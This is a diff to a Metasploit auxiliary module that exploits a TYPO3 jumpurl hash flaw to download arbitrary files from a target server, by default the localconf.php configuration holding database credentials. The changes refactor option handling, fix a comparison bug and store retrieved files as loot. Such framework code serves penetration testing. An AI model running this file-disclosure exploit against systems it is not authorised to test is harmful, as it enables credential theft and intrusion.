@@ -29,7 +29,12 @@ class MetasploitModule < Msf::Auxiliary
         'Actions' => [
           ['Download', { 'Description' => 'Download arbitrary file' }]
         ],
-        'DefaultAction' => 'Download'
+        'DefaultAction' => 'Download',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -37,7 +42,6 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('URI', [true, 'Typo3 Path', '/']),
         OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),
-        OptString.new('LFILE', [true, 'The local filename to store the data', 'localconf.php']),
       ]
     )
   end
@@ -58,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     }, 25)
 
-    if (res && (res.message == 'OK'))
+    if res && (res.message == 'OK')
       res.body =~ /jumpurl Secure: Calculated juHash, ((\w)+), did not match the submitted juHash./
 
       if ::Regexp.last_match(1).nil?
@@ -87,14 +91,23 @@ class MetasploitModule < Msf::Auxiliary
       }
     }, 25)
 
-    if (file && ((file.message = 'OK')))
+    if file && file.message == 'OK'
       if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
         print_error("File #{datastore['RFILE']} does not exist.")
         return
       end
 
-      print_status("Writing local file #{datastore['LFILE']}.")
-      open(datastore['LFILE'], 'w') { |f| f << file.body }
+      fname = File.basename(datastore['RFILE'].downcase)
+      print_good("Writing file #{fname} to loot")
+      store_path = store_loot(
+        'typo3_' + fname,
+        'application/octet-stream',
+        Rex::Socket.getaddress(rhost),
+        file.body,
+        'typo3_' + fname,
+        'Typo3_sa_2009_002'
+      )
+      print_good("File successfully retrieved and saved: #{store_path}")
     else
       print_error('Error while getting file.')
     end
